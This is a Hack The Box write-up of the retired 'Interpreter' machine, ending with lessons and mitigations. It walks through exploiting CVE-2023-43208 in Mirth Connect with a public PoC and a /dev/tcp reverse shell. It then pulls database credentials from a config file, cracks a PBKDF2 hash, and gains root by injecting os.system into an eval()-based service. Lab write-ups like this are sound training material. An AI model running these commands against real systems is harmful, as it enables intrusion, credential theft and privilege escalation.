---
machine: Interpreter
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, mirth-connect, cve-2023-43208, xstream, eval, hl7]
---

# Interpreter — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A healthcare integration platform: **Mirth Connect 4.4.0** with **CVE-2023-43208**, a pre-auth Java deserialization through XStream on `/api/users`. Shell as `mirth`; `mirth.properties` hands over MariaDB credentials, and a **PBKDF2-HMAC-SHA256** hash in the users table cracks and is reused over SSH. Root sits in a Flask service listening only on `127.0.0.1:54321` that evaluates an **f-string with `eval()`** over patient data.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh
8080/tcp  http    Mirth Connect 4.4.0
8443/tcp  https   Mirth Connect REST API
6661/tcp  http    (internal interface)
```

## Foothold: CVE-2023-43208

XStream deserializes `/api/users` XML with no class allowlist. With a public PoC:

```bash
git clone https://github.com/IHTeam-Sec/MirthRCE && cd MirthRCE
python3 exploit.py -t https://<IP>:8443 \
  -c "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"
```

```bash
nc -lvnp 4444
```

```text
uid=1000(mirth) gid=1000(mirth) groups=1000(mirth)
```

## Lateral movement

```bash
grep -iE "database\.(url|user|password)" /opt/mirthconnect/conf/mirth.properties
```

```text
database.url = jdbc:mysql://localhost:3306/mirthdb
database.user = mirth
database.password = <password>
```

```bash
mysql -u mirth -p'<password>' mirthdb -e "select username, password from users;"
```

```text
sedric | <PBKDF2-HMAC-SHA256 hash>
```

```bash
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt
ssh sedric@<IP>
```

## Escalation: eval() in a local service

```bash
ss -ltnp | grep '127.0.0.1'
```

```text
127.0.0.1:54321  python3  notif.py
```

The service runs as **root**, takes JSON with patient fields and builds its query through an f-string that reaches `eval()`. A controlled field becomes arbitrary execution:

```bash
curl -s http://127.0.0.1:54321/notify \
  -H 'Content-Type: application/json' \
  -d '{"filter":"__import__('"'"'os'"'"').system('"'"'chmod +s /bin/bash'"'"')"}'
```

If characters are filtered, encode the order (`chr()` or base64) and assemble the string inside `eval` itself.

```bash
/bin/bash -p
# euid=0
```

## Evidence (redacted)

```text
/home/sedric/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- **XStream** is a repeat offender (Mirth, Jenkins, OFBiz): a version without an allowlist means pre-auth RCE.
- `mirth.properties` is the first file to read after landing on Mirth; it usually carries the database in clear text.
- A service on `127.0.0.1` is **not** safe: any user shell can reach it.
- Mitigation: patched Mirth with an XStream allowlist, secrets outside `.properties`, and no `eval()` on external data.
